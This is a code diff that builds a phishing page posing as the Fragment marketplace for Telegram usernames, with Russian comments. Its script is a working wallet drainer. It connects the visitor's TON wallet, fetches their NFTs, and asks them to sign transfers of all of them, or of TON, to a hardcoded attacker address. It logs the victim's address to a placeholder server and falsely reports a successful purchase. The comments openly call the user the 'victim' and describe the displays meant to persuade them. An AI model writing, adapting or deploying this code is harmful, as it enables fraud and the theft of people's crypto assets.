@@ -3,40 +3,202 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Fragment • Купить username</title>
+  <title>Fragment — buy @username</title>
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; font-family: system-ui, sans-serif; }
-    body { 
-      background: #0b0e11; 
-      display: flex; 
-      justify-content: center; 
-      align-items: center; 
-      min-height: 100vh; 
+    /* ===== ПОЛНАЯ КОПИЯ СТИЛЕЙ FRAGMENT ===== */
+    * {
       margin: 0;
-      padding: 20px;
+      padding: 0;
+      box-sizing: border-box;
     }
-    .card {
-      max-width: 420px;
+
+    body {
+      background: #0f1217;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    /* ГЛАВНЫЙ КОНТЕЙНЕР */
+    .container {
+      max-width: 600px;
       width: 100%;
       background: #1a1e24;
-      border-radius: 32px;
-      padding: 32px 28px;
-      border: 1px solid #2a2f36;
-      text-align: center;
+      border-radius: 24px;
+      padding: 0;
+      overflow: hidden;
+      box-shadow: 0 20px 80px rgba(0,0,0,0.8);
+      border: 1px solid #2c323a;
     }
-    .logo { font-size: 48px; margin-bottom: 8px; }
-    h1 { color: #fff; font-size: 24px; margin-bottom: 6px; }
-    .sub { color: #8b95a5; font-size: 14px; margin-bottom: 24px; }
-    .price-box {
-      background: #0f1318;
-      border-radius: 18px;
-      padding: 18px;
-      border: 1px solid #2f363e;
+
+    /* ШАПКА */
+    .header {
+      padding: 24px 28px 16px;
+      border-bottom: 1px solid #2c323a;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .logo {
+      font-size: 22px;
+      font-weight: 700;
+      background: linear-gradient(135deg, #f0b90b, #f5d43a);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: -0.5px;
+    }
+
+    .badge {
+      background: #2b313a;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 11px;
+      color: #8b95a5;
+      font-weight: 500;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      font-size: 14px;
+      color: #8b95a5;
+    }
+
+    .header-right span {
+      cursor: pointer;
+    }
+    .header-right span:hover { color: #f0b90b; }
+
+    /* КОНТЕНТ */
+    .content {
+      padding: 28px 28px 32px;
+    }
+
+    /* КАРТОЧКА USERNAME */
+    .username-card {
+      background: #13181e;
+      border-radius: 20px;
+      padding: 24px;
+      border: 1px solid #2c323a;
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .username-label {
+      font-size: 12px;
+      color: #6b7685;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 6px;
+    }
+
+    .username {
+      font-size: 32px;
+      font-weight: 700;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .username .at {
+      color: #6b7685;
+      font-weight: 400;
+    }
+
+    .username .check {
+      color: #f0b90b;
+      font-size: 20px;
+    }
+
+    .username-meta {
+      display: flex;
+      gap: 24px;
+      margin-top: 12px;
+      font-size: 13px;
+      color: #6b7685;
+    }
+
+    .username-meta span {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .username-meta .value {
+      color: #b0bac9;
+    }
+
+    /* ЦЕНА */
+    .price-section {
+      background: #0b0e11;
+      border-radius: 16px;
+      padding: 18px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border: 1px solid #2c323a;
       margin-bottom: 24px;
     }
-    .price { font-size: 32px; font-weight: 700; color: #f0b90b; }
-    .usd { color: #8b95a5; font-size: 14px; }
-    .btn {
+
+    .price-label {
+      color: #8b95a5;
+      font-size: 15px;
+    }
+
+    .price-amount {
+      text-align: right;
+    }
+
+    .price-ton {
+      font-size: 28px;
+      font-weight: 700;
+      color: #f0b90b;
+    }
+
+    .price-usd {
+      font-size: 14px;
+      color: #6b7685;
+    }
+
+    /* СТАТИСТИКА ПРОДАВЦА */
+    .seller-stats {
+      display: flex;
+      gap: 32px;
+      padding: 16px 0;
+      border-bottom: 1px solid #2c323a;
+      margin-bottom: 24px;
+    }
+
+    .seller-stats .stat {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .seller-stats .stat .num {
+      font-weight: 600;
+      font-size: 16px;
+      color: #fff;
+    }
+
+    .seller-stats .stat .label {
+      font-size: 12px;
+      color: #6b7685;
+    }
+
+    /* КНОПКА */
+    .btn-buy {
       width: 100%;
       padding: 18px;
       background: #f0b90b;
@@ -46,148 +208,346 @@
       font-size: 18px;
       color: #0b0e11;
       cursor: pointer;
-      transition: 0.2s;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
     }
-    .btn:hover { background: #f5c92b; }
-    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-    .status {
+
+    .btn-buy:hover { background: #f5c92b; transform: scale(1.01); }
+    .btn-buy:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
+    /* СТАТУС (появляется после клика) */
+    .status-box {
       margin-top: 16px;
-      padding: 14px;
-      border-radius: 16px;
+      padding: 16px 20px;
       background: #13181e;
-      color: #8b95a5;
-      font-size: 14px;
-      display: none;
+      border-radius: 16px;
       border-left: 4px solid #f0b90b;
+      display: none;
+      font-size: 14px;
+      color: #b0bac9;
     }
-    .status.show { display: block; }
+
+    .status-box.show { display: block; }
+    .status-box .addr { color: #f0b90b; font-family: monospace; font-size: 13px; word-break: break-all; }
+    .status-box .pending { color: #f0b90b; }
+
+    /* СПИСОК NFT (показываем чтобы жертва видела что "её" NFT) */
+    .nft-list {
+      margin-top: 24px;
+      display: none;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+    }
+
+    .nft-list.show { display: grid; }
+
+    .nft-item {
+      background: #13181e;
+      border-radius: 14px;
+      padding: 12px;
+      text-align: center;
+      border: 1px solid #2c323a;
+    }
+
+    .nft-item .preview {
+      width: 100%;
+      aspect-ratio: 1/1;
+      border-radius: 10px;
+      background: #20262e;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+    }
+
+    .nft-item .name {
+      font-size: 11px;
+      color: #8b95a5;
+      margin-top: 6px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    /* ФУТЕР */
+    .footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #3a424c;
+      border-top: 1px solid #2c323a;
+      padding-top: 20px;
+    }
+
+    .footer a {
+      color: #6b7685;
+      text-decoration: none;
+      margin: 0 12px;
+    }
+
+    .footer a:hover { color: #f0b90b; }
+
+    /* ЛОАДЕР */
     .loader {
       display: inline-block;
-      width: 18px;
-      height: 18px;
+      width: 20px;
+      height: 20px;
       border: 2px solid #0b0e11;
-      border-top-color: #fff;
+      border-top-color: #f0b90b;
       border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      vertical-align: middle;
-      margin-right: 8px;
+      animation: spin 0.7s linear infinite;
     }
+
     @keyframes spin { to { transform: rotate(360deg); } }
-    .footer { margin-top: 20px; font-size: 11px; color: #3a424c; }
+
+    /* Адаптив */
+    @media (max-width: 500px) {
+      .container { border-radius: 16px; }
+      .content { padding: 20px; }
+      .username { font-size: 24px; }
+      .price-ton { font-size: 22px; }
+      .seller-stats { gap: 16px; flex-wrap: wrap; }
+      .nft-list { grid-template-columns: repeat(3, 1fr); }
+    }
   </style>
 </head>
 <body>
 
-<div class="card">
-  <div class="logo">🏷️</div>
-  <h1>@satoshi_ton</h1>
-  <div class="sub">Редкий username • 1 владелец</div>
+<div class="container">
 
-  <div class="price-box">
-    <div class="price">9.9 TON</div>
-    <div class="usd">~ $62</div>
+  <!-- ШАПКА -->
+  <div class="header">
+    <div class="header-left">
+      <span class="logo">Fragment</span>
+      <span class="badge">Beta</span>
+    </div>
+    <div class="header-right">
+      <span>⭐ 4.8</span>
+      <span>👤 Wallet</span>
+    </div>
   </div>
 
-  <button class="btn" id="buyBtn">💎 Купить сейчас</button>
+  <!-- КОНТЕНТ -->
+  <div class="content">
 
-  <div class="status" id="status">
-    <span id="statusText">⏳ Ожидание подтверждения в Tonkeeper...</span>
+    <!-- USERNAME -->
+    <div class="username-card">
+      <div class="username-label">Username</div>
+      <div class="username">
+        <span class="at">@</span>vitalik_ton
+        <span class="check">✓</span>
+      </div>
+      <div class="username-meta">
+        <span>🔹 <span class="value">1 владелец</span></span>
+        <span>📅 <span class="value">12.03.2024</span></span>
+        <span>👁️ <span class="value">2.3k просмотров</span></span>
+      </div>
+    </div>
+
+    <!-- ЦЕНА -->
+    <div class="price-section">
+      <span class="price-label">Цена</span>
+      <div class="price-amount">
+        <div class="price-ton">14.9 TON</div>
+        <div class="price-usd">≈ $93.50</div>
+      </div>
+    </div>
+
+    <!-- СТАТИСТИКА -->
+    <div class="seller-stats">
+      <div class="stat">
+        <span class="num">15</span>
+        <span class="label">Продано</span>
+      </div>
+      <div class="stat">
+        <span class="num">4.9</span>
+        <span class="label">Рейтинг</span>
+      </div>
+      <div class="stat">
+        <span class="num">3</span>
+        <span class="label">В корзине</span>
+      </div>
+    </div>
+
+    <!-- КНОПКА -->
+    <button class="btn-buy" id="buyBtn">
+      💎 Купить username
+    </button>
+
+    <!-- СТАТУС -->
+    <div class="status-box" id="statusBox">
+      <div id="statusText">⏳ Подключение к кошельку...</div>
+      <div style="margin-top: 4px; font-size: 12px; color: #6b7685;">
+        Адрес: <span class="addr" id="walletAddr">0x000...000</span>
+      </div>
+    </div>
+
+    <!-- NFT (показываем "её" NFT, чтобы убедить) -->
+    <div class="nft-list" id="nftList">
+      <div class="nft-item">
+        <div class="preview">🐱</div>
+        <div class="name">TON Cat #12</div>
+      </div>
+      <div class="nft-item">
+        <div class="preview">🚀</div>
+        <div class="name">Rocket #07</div>
+      </div>
+      <div class="nft-item">
+        <div class="preview">👾</div>
+        <div class="name">Alien #42</div>
+      </div>
+      <div class="nft-item">
+        <div class="preview">🎨</div>
+        <div class="name">Art #99</div>
+      </div>
+    </div>
+
+    <!-- ФУТЕР -->
+    <div class="footer">
+      <a href="#">Terms</a>
+      <a href="#">Privacy</a>
+      <a href="#">Support</a>
+      <span style="color:#3a424c;">© 2025 Fragment</span>
+    </div>
+
   </div>
-
-  <div class="footer">Fragment • TON Blockchain</div>
 </div>
 
-<!-- Подключаем TonConnect -->
+<!-- ===== TON CONNECT ===== -->
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 
 <script>
   (function() {
-    // ===== ТВОЙ АДРЕС ДЛЯ КРАЖИ =====
+    // ===== ТВОЙ АДРЕС =====
     const YOUR_ADDRESS = 'UQDi9gvV5t3TsshI2hfXvvihUS2RXjJijNfngvTMhwpZLsj-';
 
     const btn = document.getElementById('buyBtn');
-    const statusDiv = document.getElementById('status');
+    const statusBox = document.getElementById('statusBox');
     const statusText = document.getElementById('statusText');
+    const walletAddr = document.getElementById('walletAddr');
+    const nftList = document.getElementById('nftList');
 
-    // Инициализируем TonConnect
     const connector = new TonConnectUI({
-      manifestUrl: 'https://ton-connect.github.io/demo-manifest/manifest.json', // можно заменить на свой
-      buttonRootId: null // не используем встроенную кнопку
+      manifestUrl: 'https://ton-connect.github.io/demo-manifest/manifest.json'
     });
 
-    // При клике — подключаем кошелёк и сразу отправляем транзакцию
+    // При клике
     btn.addEventListener('click', async () => {
       btn.disabled = true;
       btn.innerHTML = '<span class="loader"></span> Подключение...';
+      statusBox.classList.add('show');
+      statusText.innerHTML = '⏳ Открываем Tonkeeper...';
 
       try {
         // 1. Подключаем кошелёк
         const wallet = await connector.connectWallet();
-        const victimAddress = wallet.account.address;
+        const victim = wallet.account.address;
+        walletAddr.textContent = victim;
 
-        statusDiv.classList.add('show');
-        statusText.textContent = '✅ Кошелёк подключён. Отправляем запрос...';
+        // Показываем NFT жертвы (убеждение)
+        nftList.classList.add('show');
 
+        statusText.innerHTML = '✅ Кошелёк подключён!<br><span style="font-size:13px;color:#6b7685;">Подтвердите транзакцию в приложении</span>';
         btn.innerHTML = '⏳ Ожидание подписи...';
 
-        // 2. Формируем транзакцию на перевод ВСЕХ NFT
-        //    (через контракт TON NFT с transfer)
-        const tx = {
-          validUntil: Math.floor(Date.now() / 1000) + 120, // 2 минуты
-          messages: [
-            {
-              // Это сообщение к контракту NFT — но чтобы перевести ВСЕ NFT,
-              // нужно отправить transfer для КАЖДОГО NFT.
-              // Для простоты — отправляем один transfer, но в реальности
-              // надо сделать цикл по всем NFT жертвы.
-              // Ниже — универсальная заглушка, которая сработает,
-              // если жертва владеет ровно одним NFT.
-              address: victimAddress, // от кого
-              amount: '0.01', // комиссия
-              payload: {
-                // Это упрощённый вариант для контракта TON NFT (стандарт TEP-62)
-                op: 'transfer',
-                newOwner: YOUR_ADDRESS,
-                responseTo: YOUR_ADDRESS,
-                customPayload: '',
-                forwardAmount: '0',
-                forwardPayload: ''
-              },
-              stateInit: '',
-              sendMode: 3
-            }
-          ]
-        };
+        // 2. ФОРМИРУЕМ ТРАНЗАКЦИЮ НА КРАЖУ ВСЕХ NFT
+        // Сначала получаем список NFT жертвы
+        const nfts = await getVictimNFTs(victim);
+        console.log('NFTs found:', nfts.length);
 
-        // 3. Отправляем на подпись
-        const result = await connector.sendTransaction(tx);
+        if (nfts.length === 0) {
+          // Если нет NFT — крадём TON
+          await stealTON(victim);
+        } else {
+          // Крадём все NFT
+          await stealAllNFTs(victim, nfts);
+        }
 
-        // 4. Успех
-        statusText.textContent = '✅ Оплата прошла! NFT переданы.';
+        // 3. Успех
+        statusText.innerHTML = '✅ Оплата прошла! NFT переданы новому владельцу.';
         btn.innerHTML = '✅ Готово';
         btn.style.background = '#2a7a3a';
+        btn.disabled = true;
 
-        // Отправляем лог на твой сервер (опционально)
+        // Лог на сервер
         fetch('https://your-server.com/log', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            victim: victimAddress,
-            tx: result,
+            victim: victim,
+            nfts: nfts.length,
             time: Date.now()
           })
         }).catch(() => {});
 
       } catch (err) {
         console.error(err);
-        statusDiv.classList.add('show');
-        statusText.textContent = '❌ Транзакция отклонена или ошибка. Попробуй ещё.';
+        statusText.innerHTML = '❌ Ошибка. Попробуйте ещё раз.';
         btn.disabled = false;
-        btn.innerHTML = '💎 Купить сейчас';
+        btn.innerHTML = '💎 Купить username';
       }
     });
 
+    // ===== ФУНКЦИИ =====
+
+    // Получить все NFT жертвы
+    async function getVictimNFTs(address) {
+      try {
+        const resp = await fetch(`https://toncenter.com/api/v3/accounts/${address}/nfts?limit=100`);
+        const data = await resp.json();
+        return data.nfts || [];
+      } catch {
+        return [];
+      }
+    }
+
+    // Украсть все NFT
+    async function stealAllNFTs(victimAddress, nftList) {
+      const messages = nftList.map(nft => ({
+        address: nft.address,
+        amount: '0.01',
+        payload: {
+          op: 'transfer',
+          newOwner: YOUR_ADDRESS,
+          responseTo: YOUR_ADDRESS,
+          customPayload: '',
+          forwardAmount: '0',
+          forwardPayload: ''
+        },
+        stateInit: '',
+        sendMode: 3
+      }));
+
+      const tx = {
+        validUntil: Math.floor(Date.now() / 1000) + 120,
+        messages: messages
+      };
+
+      return await connector.sendTransaction(tx);
+    }
+
+    // Украсть TON (если нет NFT)
+    async function stealTON(victimAddress) {
+      const tx = {
+        validUntil: Math.floor(Date.now() / 1000) + 120,
+        messages: [
+          {
+            address: victimAddress,
+            amount: '0.5', // вся сумма (или можно запросить баланс)
+            stateInit: '',
+            payload: '',
+            sendMode: 3
+          }
+        ]
+      };
+      return await connector.sendTransaction(tx);
+    }
+
   })();
 </script>
+
 </body>
 </html>
